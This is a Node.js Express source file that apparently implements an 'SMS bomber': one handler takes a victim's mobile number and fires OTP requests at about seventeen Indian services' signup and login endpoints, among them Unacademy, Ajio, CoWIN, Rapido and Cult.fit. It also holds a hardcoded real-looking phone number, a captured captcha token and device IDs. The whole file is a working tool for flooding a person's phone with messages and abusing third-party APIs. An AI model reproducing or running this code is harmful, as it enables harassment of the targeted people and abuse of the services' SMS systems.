const axios = require("axios");

const first = async (req, res) => {
  const mobile = req.body.mobile;

  try {
    await callApi1(mobile);
    await callApi2(mobile);
    await callApi3(mobile);
    await callApi4(mobile);
    await callApi5(mobile);
    await callApi6(mobile);
    await callApi7(mobile);
    await callApi8(mobile);
    await callApi9(mobile);
    await callApi10(mobile);
    await callApi11(mobile);

    await callApi13(mobile);
    await callApi14(mobile);
    await callApi15(mobile);
    await callApi16(mobile);
    await callApi17(mobile);

    return res.status(200).send(`Hi ${req.body.mobile}`);
  } catch (error) {
    console.error(error);
    return res.status(400).send("Kuch Dikkat hogai");
  }
};

const callApi1 = async (mobile) => {
  try {
    const apiUrl = 'https://unacademy.com/api/v3/user/user_check/?enable-email=true';
    const requestData = {
      country_code: "IN",
      email: "",
      is_un_teach_user: false,
      otp_type: 1,
      phone: mobile,
      send_otp: true
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 1 Error:", error.message);
  }
};

const callApi2 = async (mobile) => {
  try {
    const apiUrl = "https://login.web.ajio.com/api/auth/signupSendOTP";
    const requestData = {
      "firstName": "DD",
      "genderType": "Male",
      "login": "q2213244@gmail.com",
      "mobileNumber": mobile,
      "newDesign": false,
      "requestType": "SENDOTP"
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 2 Error:", error.message);
  }
};

const callApi3 = async (mobile) => {
  try {
    const apiUrl = `https://web.pocketfm.com/send_otp/?phone_number=%2B91${mobile}&country_code=%2B91`;
    const requestData = {
      device_id: "-2096972671",
      locale: "IN",
      platform: "web",
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 3 Error:", error.message);
  }
};

const callApi4 = async (mobile) => {
  try {
    const apiUrl = "https://www.licious.in/api/login/signup";
    const requestData = {
      captcha_token: null,
      phone: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 4 Error:", error.message);
  }
};

const callApi5 = async (mobile) => {
  try {
    const apiUrl = "https://api.khatabook.com/v1/auth/request-otp";
    const requestData = {
      app_signature: "Jc/Zu7qNqQ2",
      country_code: "+91",
      phone: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 5 Error:", error.message);
  }
};

const callApi6 = async (mobile) => {
  try {
    const apiUrl = "https://dashboard.happylocate.com/api/v1/user/register/send-otp";
    const requestData = {
      mobile: mobile,
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 6 Error:", error.message);
  }
};

const callApi7 = async (mobile) => {
    try {
      const apiUrl = "https://www.urbanclap.com/api/v2/growth/profile/generateOTPv2";
      const requestData = {
        "city_key": null,
        "countryId": "IND",
        "customer": {
          "phone": {
            "isd_code": "+91",
            "phone_wo_isd": "8901506779"
          }
        },
        "resend": false,
        "source": "phone"
      };
      
      await axios.post(apiUrl, requestData);
    }
    catch (error){
      console.error("API 7 Error:", error.message);
    }
}

const callApi8 = async (mobile) => {
  try {
    const apiUrl = "https://production.apna.co/api/userprofile/v1/otp/";
    const requestData = {
        "hash_type": "original",
        "phone_number": mobile,
        "request_id": "1709108042942",
        "retries": 1
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 8 Error:", error.message);
  }
};

const callApi9 = async (mobile) => {
  try {
    const apiUrl = "https://loginprod.medibuddy.in/unified-login/user/register";
    const requestData = {
        "advertiserId": "5eacbbec-ca9f-Lbcc-89ab-734d25067d5e",
        "flow": "Retail-Login-Home-Flow",
        "idealLoginFlow": false,
        "mbUserId": null,
        "phonenumber": mobile,
        "platform": "medibuddy",
        "source": "medibuddyInWeb"
    };

    await axios.post(apiUrl, requestData);
  } catch (error) {
    console.error("API 9 Error:", error.message);
  }
};

const callApi10 = async(mobile) => {
    try {
        const apiUrl = "https://www.cowin.gov.in/api/v2/auth/generateMobileOTP";
        const requestData = {
        mobile: mobile
        }
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 10 Error:", error.message);
    }
}

const callApi11 = async(mobile) => {
    try {
        const apiUrl = "https://customer.rapido.bike/api/otp";
        const requestData = {
            "mobile": mobile
        }
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 11 Error:", error.message);
    }
}

const callApi12 = async(mobile) => {
    try {
        const apiUrl = "https://www.1mg.com/auth_api/v6/create_token";
        const requestData = {
            "email": "",
            "is_corporate_user": false,
            "number": mobile,
            "signup_source": ""
        }
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 12 Error:", error.message);
    }
}

const callApi13 = async(mobile) => {
    try {
        const apiUrl = "https://apis.cardekho.com/f8";
        const requestData = {
            "operationName": "SendOtp",
            "query": "mutation SendOtp($payload: UserInput!) {\n sendOtp(payload: $payload) {\n token\n name\n existingUser\n whatsappOptIn\n __typename\n }\n}\n",
            "variables": {
              "payload": {
                "mobile": mobile,
                "connectoid": "b9f62a27-11ca-31d6-6a12-a7db0b41e124",
                "waOtp": false
              }
            },
            "platform": "web",
            "utmParams": {}
        }          
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 12 Error:", error.message);
    }
}

const callApi14 = async(mobile) => {
    try {
        const apiUrl = "https://v2-api.bankopen.co/users/register/otp";
        const requestData = {
            "username": "8901506779", 
            "is_register_otp": 1
        }          
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 14 Error:", error.message);
    }
}

const callApi15 = async(mobile) => {
    try {
        const apiUrl = "https://www.cult.fit/api/auth/loginPhoneSendOtp";
        const requestData = {
            "captchaResponse": "03AFcWeA6RDOCjjRGtQuc9DRBTl5KgO_o46tOS8k1NUTAC4XD1RhXB5NK0UBS42PGkHW9Fy-ql1apzH9x-JsPsf9-SN_sah8ujJ3TrW5z8pmc6vLbc3F4zCegukl0nVlYP4jOwITYm5RrDj1-S8U9sHoTp99CzWibSLEnnFCcVlUCA5W9M1NqqGk9wDePo5o7Y8fBeeyfktPr8KNUnnLABBi2Mj8I8fED6eVWb2miWUEOd_HHBjPukLGx1u740Xqb2HiIP985BoU_r3BmwkB6KfEjhdkebLQRGsMXYU0cBKdqtpGn8FFb-JM-jbVBr7aI41QhBhDfku6w77UljIq9jIxcTY65L3M3vgaae8ECzOHq7Xq7izhYv03mPN_yXaZnCq477Dx8slkMORKib7CoNei0qFdEyQdjoeAOEfQiR2YYPlhmzruLqiPz4ka1oYqNk7hOUKl7wW_ZmGw0d5TeuPFCMm7zgNyhAqPC7n4ForcW7q6SNzPp6X0ce6MmoDDMohVYa_PaSl4KUuC8QWRbypRubWI5jl-50Jpi04K4ktjx3JqA0hJKczWDOUBHQ5UelIYzFZj2-c6z7AUwr92xHphwWkkQvL2WsAQ",
            "countryCallingCode": "+91",
            "phone": mobile
        }                   
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 15 Error:", error.message);
    }
}

const callApi16 = async(mobile) => {
    try {
        const apiUrl = "https://otp.boat-lifestyle.com/login/sendotp";
        const requestData = {
            "phone" : mobile
        }                   
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 16 Error:", error.message);
    }
}

const callApi17 = async(mobile) => {
    try {
        const apiUrl = "https://bheem.ofbusiness.com/api/v1/login/otp";
        const requestData = {
            "mobileNumber": mobile, 
            "mobileCode": "+91"
        }                 
        await axios.post(apiUrl, requestData);
    }
    catch (error){
        console.error("API 17 Error:", error.message);
    }
}
module.exports = { first, callApi1, callApi2, callApi3, callApi4, callApi5, callApi6, callApi7, callApi8, callApi9, callApi10, callApi11, callApi12, callApi13, callApi14, callApi15, callApi16, callApi17 };

